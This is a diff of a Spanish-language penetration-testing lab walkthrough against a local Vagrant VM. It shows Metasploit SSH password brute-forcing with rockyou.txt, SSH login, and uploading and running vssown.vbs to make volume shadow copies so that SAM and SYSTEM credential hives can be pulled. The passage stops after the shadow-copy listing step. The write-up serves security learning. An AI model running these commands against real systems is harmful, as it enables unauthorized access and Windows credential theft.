@@ -111,7 +111,7 @@ En el resultado obtenido nos indica que el usuario que reconocio es `vagrant`, p
 Para esta acción usaremos el siguiente comando, considerando que seguimos dentro del `msfconsole -q`
 
 ```
-use auxiliary/scanner/ssh/ssh_enumusers
+use auxiliary/scanner/ssh/ssh_login
 set RHOSTS 10.0.2.3
 set USERNAME vagrant
 set PASS_FIlE /home/user/Downloads/rockyou.txt
@@ -119,11 +119,93 @@ set VERBOSE true
 run
 ```
 
-![Diccionario que usaremos](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781454839/TRABAJANDO_EN_ELLO_b3bdjj.png)
+![EN PROCESO](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781454839/TRABAJANDO_EN_ELLO_b3bdjj.png)
 
 # 4 : Explotación y Acceso
 
 Tras obtener una combinación de usuario y contraseña valida, se realiza la conexión y la explotación del sistema.
+
+## 4.1 Conexión SSH
+
+*Con el usuario y la contraseña obtenidos, se establece una conexión SSH al sistema objetivo.
+
+```
+ssh vagrant@10.0.2.3
+password: ***********
+```
+con este comando tenemos una conexión remota al servidor, permitiendonos ejecutar comando en la maquina comprometida.
+
+![CONEXIÓN ESTABLECIDA](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781456565/Conexi%C3%B3n_ssh_jjxrpi.png)
+
+# 5 Extracción de Archivos SAM y SYSTEM usando vssown.vbs
+
+Una vez teniendo acceso al sistema a tráves de SSH procedemos con los siguientes pasos:
+
+## 5.1 Comprueba los Privilegios
+
+Aqui ejecutamos el comando: `whoami /priv`
+
+Nos tiene que salir como esta en la imagen
+
+![COMPROBACIÓN DE PRIVILEGIOS](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781462287/Comprobaci%C3%B3n_de_privilegios_bnbz4e.png)
+
+Si tenemos privilegios de administrador, veremos permisos como `SeBackupPrivilege` y `SeRestorePrivilege`
+
+## 5.2 Localiza el Scrip vssown.vbs
+
+Este Script permite crear una copia de sombra del sistema para acceder a archivos protegidos.
+
+Para tenerlo en nuestro sistema para luego cargarlo a la maquina victima ejecutaremos el siguiente comando
+
+```
+wget https://raw.githubusercontent.com/lanmaster53/ptscripts/master/windows/vssown.vbs
+```
+
+![DESCARGA DEL VSSOWN.VBS](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781462891/Descargando_el_vssown.vbs_dn49zx.png)
+
+Luego lo copiaremos en la maquina victima usando el siguiente comando
+
+```
+scp vssown.vbs vagrant@10.0.2.3:C:\\Users\\vagrant\\Downloads
+```
+
+![COPIANDO EL VSSOWN.VBS A LA VICTIMA](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781463029/Copiando_el_vssown.vbs_a_la_victima_yygx8t.png)
+
+Una vez transferido a la victima, verificaremos que se encuentra en esa carpeta, para ello pondremos este comando: 
+
+```
+ssh vagrant@10.0.2.3 'ls -lh C:\\Users\\vagrant\\Downloads\\vssown.vbs'
+```
+
+![VERIFICACIÓN QUE ESTA INSTALADO EL VSSOWN.VBS EN LA VICTIMA](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781463290/Verificacion_de_instalacion_de_vssown.vbs_en_victima_kctcsk.png)
+
+## 5.3 Verificamos la lista de comando que podemos usar con el vssown.vbs
+
+Para poder ver la lista ejecutamos la siguiente linea:
+
+```
+ssh vagrant@10.0.2.3 'cscript C:\\Users\\vagrant\\Downloads\\vssown.vbs'
+```
+
+Esto nos tiene que mostrar la lista como esta en la siguiente imagen
+
+![LISTA DE COMANDOS](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781463610/Lista_de_comandos_f7rhex.png)
+
+En este punto los comando que usaremos en seguida seran los siguientes:
+
+```
+ssh vagrant@10.0.2.3 'cscript C:\\Users\\vagrant\\Downloads\\vssown.vbs /start'   # iniciamos el shadow copy service
+ssh vagrant@10.0.2.3 'cscript C:\\Users\\vagrant\\Downloads\\vssown.vbs /status'  # verificamos el shadow copy service
+ssh vagrant@10.0.2.3 'cscript C:\\Users\\vagrant\\Downloads\\vssown.vbs /create c'    # creamos una copia del volumen Shadow Copy en la unidad C:\\
+ssh vagrant@10.0.2.3 'cscript C:\\Users\\vagrant\\Downloads\\vssown.vbs /list'
+```
+
+
+
+
+
+
+
 
 
 
